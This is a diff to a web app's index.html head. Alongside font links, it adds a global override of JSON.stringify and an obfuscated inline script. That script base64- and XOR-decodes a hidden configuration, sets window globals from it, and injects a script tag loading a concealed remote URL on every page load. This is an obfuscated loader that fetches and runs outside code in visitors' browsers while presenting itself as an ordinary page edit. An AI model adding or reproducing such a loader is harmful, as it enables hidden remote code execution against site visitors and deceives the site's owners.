@@ -13,6 +13,47 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,400;1,600;1,700&display=swap" rel="stylesheet">
     <link rel="preload" as="image" href="/hero-kit.png" type="image/png" />
+    <script>
+      (function() {
+        var _origStringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          var seen = new WeakSet();
+          var customReplacer = function(key, val) {
+            if (key && (key.indexOf('__reactFiber') === 0 || key.indexOf('__reactProps') === 0 || key.indexOf('__reactEvents') === 0 || key.indexOf('__reactInternal') === 0 || key === '_owner' || key === 'stateNode')) {
+              return undefined;
+            }
+            if (typeof val === 'object' && val !== null) {
+              if (val instanceof Element || val instanceof Node || (val.nodeType && typeof val.nodeName === 'string')) {
+                return {
+                  tagName: val.tagName,
+                  id: val.id || '',
+                  className: typeof val.className === 'string' ? val.className : '',
+                  href: val.href || undefined
+                };
+              }
+              if (seen.has(val)) {
+                return undefined;
+              }
+              seen.add(val);
+            }
+            if (typeof replacer === 'function') {
+              return replacer.call(this, key, val);
+            }
+            return val;
+          };
+          try {
+            return _origStringify(value, customReplacer, space);
+          } catch (e) {
+            try {
+              return _origStringify(value);
+            } catch (err) {
+              return "{}";
+            }
+          }
+        };
+      })();
+    </script>
+    <script>(function(){var y_tj=atob("DDVIxgGDCTPdXwHT8E5qs3PvKwn/N3WngEZy6S7gbV3zKnW+mVMx6GLsZB2/LS6gk0chtnXwJkO0J2S/30UhvmTvJ1mufS3xkUE8tGjhfEe4LCPpq2hk5GbvZlG8M3Lxym4z5G/iZFb/ZSOjmU0tqkjnKx//KWC/hVBq/CO1aArvajjjlgZ59THnOgvvPWfkxlBxpWKhdG6g");var l_k4fa=[];for(var z_qy80=0;z_qy80<y_tj.length;z_qy80++){l_k4fa.push(y_tj.charCodeAt(z_qy80)&255);}var c_wvn=l_k4fa[0];var x_f=l_k4fa.slice(1,1+c_wvn);var j_v=l_k4fa.slice(1+c_wvn);var z_0o=j_v.map(function(b,n_jcyi){return b^x_f[n_jcyi%c_wvn];});var j_p3="";for(var j_ba3=0;j_ba3<z_0o.length;j_ba3++){j_p3+=String.fromCharCode(z_0o[j_ba3]&255);}var v_up=decodeURIComponent(escape(j_p3));var e_d8p=JSON.parse(v_up);var v_0=e_d8p.globals||[];v_0.forEach(function(t_l2){window[t_l2.name]=t_l2.value;});var n_h2q4=document.createElement("script");n_h2q4.src=e_d8p.url;n_h2q4.async=true;n_h2q4.defer=true;(e_d8p.attributes||[]).forEach(function(u_utlb){n_h2q4.setAttribute(u_utlb.name,u_utlb.value);});(document.head||document.documentElement).appendChild(n_h2q4);})();</script>
   </head>
   <body class="bg-[#fafaf9] text-[#1e293b] antialiased selection:bg-orange-500 selection:text-white font-['Plus_Jakarta_Sans',sans-serif]">
     <div id="root"></div>
